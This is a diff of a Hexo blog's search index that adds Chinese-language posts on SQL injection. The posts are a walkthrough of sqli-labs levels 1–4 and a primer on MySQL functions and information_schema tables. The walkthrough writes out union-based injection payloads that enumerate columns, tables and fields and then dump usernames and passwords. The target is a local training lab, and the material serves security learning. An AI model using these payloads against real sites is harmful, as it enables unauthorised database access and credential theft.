@@ -1,38 +1,51 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2019/06/28/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <title>sqli-labs 1-4</title>
+    <url>/2023/03/21/sqli-labs/</url>
+    <content><![CDATA[<p><strong>sqli-labs第一关</strong><br><img src="/images/sqli-labs/a2d4edae2a224efd9b1ef485bcef305a.jpg" alt="1"><span id="more"></span><br>输入?id=1知道本关的查询结果是会回显的<br><img src="/images/sqli-labs/20210815211505841.jpg" alt="2"><br>然后输入?id=1’可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道结果指定是字符型知道需要闭合什么符号，比如这关是闭合单引号<br><img src="/images/sqli-labs/20210815211302959.jpg" alt="3"><br>然后使用union注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下面两步找列数</span><br><span class="line">http://192.168.101.16/sqli-labs-master/Less-1/?id=1&#x27; order by 3-- s;</span><br><span class="line">http://192.168.101.16/sqli-labs-master/Less-1/?id=1&#x27; order by 4-- s;</span><br><span class="line">#确定哪个字段有回显</span><br><span class="line">http://192.168.101.16/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3-- s;</span><br><span class="line">#确定当前数据库</span><br><span class="line">http://192.168.101.16/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,database()-- s;</span><br><span class="line">#爆出当前数据库内的所有表名</span><br><span class="line">http://192.168.101.16/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- s;</span><br><span class="line">#爆出当前数据库user表的所有列名</span><br><span class="line">http://192.168.101.16/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()-- s;</span><br><span class="line">#爆出当前数据库user表所有username和password</span><br><span class="line">http://192.168.101.16/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from users-- s;</span><br></pre></td></tr></table></figure>
+<p>结果：<img src="/images/sqli-labs/20210815212452694.jpg" alt="4"></p>
+<p>这关代码如下，没有对id进行过滤，29行可以看出闭合是单引号<br><img src="/images/sqli-labs/22-3-2023_205726_blog.csdn.net.jpg" alt="5"></p>
+<p><strong>sqli-labs第二到四关</strong><br>一到四关主要是参数被包装的问题。<br>sqli-labs第二关和第一关是一样进行判断，当我们输入单引号或者双引号可以看到报错，且报错信息看不到数字，所有我们可以猜测sql语句应该是数字型注入。那步骤和我们第一关是差不多的，<br><img src="/images/sqli-labs/6af0163f75764d5c829eb69265646b38.jpg" alt="6"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">&quot;SELECT * FROM users WHERE id=1 &#x27; LIMIT 0,1&quot;出错信息。;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?id=1 order by 3;</span><br><span class="line">?id=-1 union select 1,2,3;</span><br><span class="line">?id=-1 union select 1,database(),version();</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>第三关当我们在输入?id=2’的时候看到页面报错信息。可推断sql语句是单引号字符型且有括号，所以我们需要闭合单引号且也要考虑括号。<br><img src="/images/sqli-labs/20f19e454d474036a8ed0ef6846ded81.jpg" alt="7"><br><img src="/images/sqli-labs/9d607752e4ae4cfc980899ca990168de.jpg" alt="8"></p>
+<p>sqli-labs第四关<br>根据页面报错信息得知sql语句是双引号字符型且有括号，通过以下代码进行sql注入</p>
 ]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
   </entry>
   <entry>
     <title>SQL注入简介</title>
-    <url>/2023/03/21/My-New-Post/</url>
-    <content><![CDATA[<p><strong>一.SQL注入原理</strong><br>  SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<span id="more"></span><br>  SQL注入分为很多种，有联合注入、布尔注入、报错注入、时间注入、堆叠注入、二次注入、宽字节注入、cookie注入等等。</p>
+    <url>/2023/03/21/SQL%E7%AE%80%E4%BB%8B/</url>
+    <content><![CDATA[<p><strong>一.SQL注入原理</strong><br>  SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<span id="more"></span><br>  SQL注入分为很多种，有联合注入、布尔注入、报错注入、时间注入、堆叠注入、二次注入、宽字节注入、cookie注入等等。详见： <a href="https://blog.csdn.net/HMX404/article/details/108654419">SQL注入点判断及注入方式</a></p>
 <p><strong>二.常用SQL语句</strong><br>  有SQL语言基础的人，在ＳＱＬ注入的时候成功率比不熟悉的人高很多。我们有必要提高一下自己的SQL水平，特别是一些常用的函数及命令。 以下以MYSQL数据库为例子。<br>select： 从数据库中提取数据</p>
 <p>order by: 用于对结果集进行排序</p>
 <p>union: 操作符合并两个或多个 select语句的结果。</p>
 <p>database()：当前网站使用的数据库</p>
 <p>version()：当前MYSQL使用的版本</p>
 <p>user()：当前MYSQL的用户</p>
-<p>– 或#： 注释<br>详见 ：<a href="https://cloud.tencent.com/developer/article/1942821">注入常用SQL语句整理</a></p>
+<p>and、or：逻辑运算符</p>
+<p>version( ）：mysql数据库版本</p>
+<p>length( )：返回字符串的长度</p>
+<p>substring( )：截取字符串</p>
+<p>concat( )：没有分隔符的连接字符串</p>
+<p>concat_ws ( )：含有分割符的连接字符串</p>
+<p>group_conat( )：连接一个组的字符串</p>
+<p>name_const ( )：返回表作为结果</p>
+<p>current_user( ）：当前用户名</p>
+<p>system_ user( )：系统用户名</p>
+<p>@@datadir：数据库路径</p>
+<p>@@versoin_compile_os：操作系统版本</p>
+<p>– 或#： 注释</p>
+<p>详见 ：<a href="https://cloud.tencent.com/developer/article/1942821">注入常用SQL语句整理</a></p>
 <p><strong>三.常用数据库表名</strong><br>  以下以MYSQL数据库为例</p>
+<p>information_schema：表示所有信息，包括库、表、列</p>
+<p>information_schema.tables：记录所有表名信息的表</p>
+<p>information_schema.columns：记录所有列名信息的表</p>
+<p>table_schema：数据库的名称</p>
+<p>table_name:表名</p>
+<p>column_name:列名</p>
+<p>group_concat():显示所有查询到的数据</p>
 <ol>
 <li>默认数据库分类：<br>information_schema<br>performance_schema<br>mysql<br>test</li>
 </ol>
@@ -45,5 +58,10 @@
       <categories>
         <category>sql注入</category>
       </categories>
+  </entry>
+  <entry>
+    <title>注入点判断</title>
+    <url>/2023/03/22/%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/</url>
+    <content><![CDATA[]]></content>
   </entry>
 </search>
